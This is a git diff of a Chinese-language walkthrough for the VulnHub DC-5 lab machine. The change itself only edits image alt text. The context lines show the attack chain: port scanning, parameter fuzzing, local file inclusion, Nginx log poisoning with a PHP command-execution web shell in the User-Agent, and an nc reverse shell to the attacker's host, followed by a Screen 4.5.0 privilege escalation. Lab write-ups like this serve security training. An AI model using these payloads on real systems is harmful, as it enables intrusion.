@@ -63,7 +63,7 @@ Installation is simple - download it, unzip it, and then import it into VirtualB
 nmap -sP 192.168.141.0/24
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/1.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/1.png)
 
 排除法,去掉自己、宿主机、网关, `192.168.141.139` 就是目标了
 
@@ -72,15 +72,15 @@ nmap -sP 192.168.141.0/24
 nmap -T5 -A -v -p- 192.168.141.139
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/2.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/2.png)
 
 三个端口，一个 web，两个 rpc，先从熟悉的 web 入手
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/3.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/3.png)
 
 都是一堆狗屁不通的东西，只在 contact 中找到可以交互的点，填写表单试试
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/4.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/4.png)
 
 随便提交了一些数据，被定向到了 `thankyou.php` 下,页面上看上去啥也没有，不过 url 参数中貌似可以 fuzz 一下
 
@@ -102,9 +102,9 @@ nmap -T5 -A -v -p- 192.168.141.139
 
 使用 burp 开始跑
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/5.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/5.png)
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/6.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/6.png)
 
 可见，跑出一个参数 file,基本可以确认这里存在一个文件包含漏洞了
 
@@ -117,17 +117,17 @@ wfuzz -w GET_params_Top99.txt -w LFI_Linux.txt --hh 851 -u http://192.168.141.13
 
 先找到日志文件,Linux+php+Nginx 环境,老规矩,爆破 Nginx 日志
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/7.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/7.png)
 
 运气不错,就拿 `/var/log/nginx/access.log` 开刀了
 
 访问 `http://192.168.141.139` 抓包,在 User-Agent: 中添加 payload: `<?php phpinfo() ?>` 测试
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/8.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/8.png)
 
 再次访问 `http://192.168.141.139/thankyou.php?file=/var/log/nginx/access.log`
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/9.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/9.png)
 
 访问 `http://192.168.141.139` 抓包,在 User-Agent: 中添加 payload: `<?php system($_GET['cmd']) ?>`
 
@@ -138,7 +138,7 @@ nc -nlvp 4444
 
 访问 `http://192.168.141.139/thankyou.php?file=/var/log/nginx/access.log&cmd=nc 192.168.141.134 4444 -e /bin/bash` 测试
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/10.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/10.png)
 
 弹回来了
 
@@ -156,7 +156,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 find / -perm -u=s 2>/dev/null
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/11.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/11.png)
 
 在 searchsploit 里找到了一个可以提权的，版本正好是 Screen 4.5.0
 ```
@@ -229,8 +229,8 @@ screen -ls
 whoami
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/12.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/12.png)
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/13.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC5/13.png)
 
 提权成功,感谢靶机作者 @DCUA7
